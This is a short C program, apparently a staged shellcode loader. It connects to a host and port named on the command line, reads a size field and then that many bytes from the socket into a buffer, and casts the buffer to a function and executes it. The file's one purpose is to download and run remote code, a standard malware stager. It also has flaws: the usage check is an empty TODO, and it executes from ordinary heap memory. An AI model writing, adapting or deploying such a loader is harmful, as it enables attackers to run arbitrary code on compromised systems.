//
// Created by Thomas John Wesolowski on 7/2/17.
//
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>

typedef unsigned char byte;

int main(int argc, char **argv){
    int sockfd, portn, payld_sz;
    byte *payld;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    if(argc<3){
        //TODO print usage and exit
    }

    portn = atoi(argv[2]);
    //create socket
    sockfd = socket(AF_INET,SOCK_STREAM,0);
    if(sockfd<0){
        perror("Failed to create socket.");
    }
    server = gethostbyname(argv[1]);
    if(server==NULL){
        perror("Could not resolve host.");
        exit(1);
    }
    //Zero server descriptor, begin setting it up
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr,(char *)&serv_addr.sin_addr.s_addr,server->h_length);
    serv_addr.sin_port = htons(portn);

    //attempt to connect to host
    if(connect(sockfd,&serv_addr, sizeof(serv_addr)) < 0){
        perror("Could not connect");
        exit(1);
    }

    //Receive payload size
    if(read(sockfd,&payld_sz,4) < 4){
        perror("Could not retrieve payload size.");
        exit(1);
    }
    printf("%d",payld_sz);
    //read payld_sz bytes from the socket
    payld = malloc(payld_sz);
    //retrieve payload from socket
    if(read(sockfd,payld,payld_sz) < payld_sz){
        perror("Error retrieving payload.");
        exit(1);
    }
    //cast shellcode to a function and execute
    (*((void (*)(void)) payld))();
}
